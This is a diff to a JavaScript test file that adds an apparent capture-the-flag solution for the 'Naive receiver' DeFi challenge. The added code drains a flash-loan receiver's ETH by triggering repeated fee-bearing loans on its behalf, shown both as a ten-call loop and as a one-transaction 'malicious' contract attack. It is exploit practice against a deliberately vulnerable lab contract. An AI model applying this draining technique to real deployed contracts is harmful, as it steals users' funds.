@@ -38,9 +38,28 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+
+        // [10 transaction solution]
+        //for(let i = 0; i < 10; i++) {
+        //   await pool.connect(player).flashLoan(
+        //       receiver.address,
+        //       await pool.ETH(),
+        //       0,
+        //       "0x"
+        //   )
+
+        // [1 transaction solution]
+
+        // first, deploy the malicious contract
+        const maliciousReceiverFactory = await ethers.getContractFactory("MaliciousNaiveReceiver", player);
+        const maliciousReceiver = await maliciousReceiverFactory.deploy(pool.address, receiver.address);
+
+        // and then call his attack function that will take out 10 flash loan on behalf of receiver
+        await maliciousReceiver.connect(player).attack();
+
     });
 
-    after(async function () {
+    after('Validation', async function () {
         /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
 
         // All ETH has been drained from the receiver
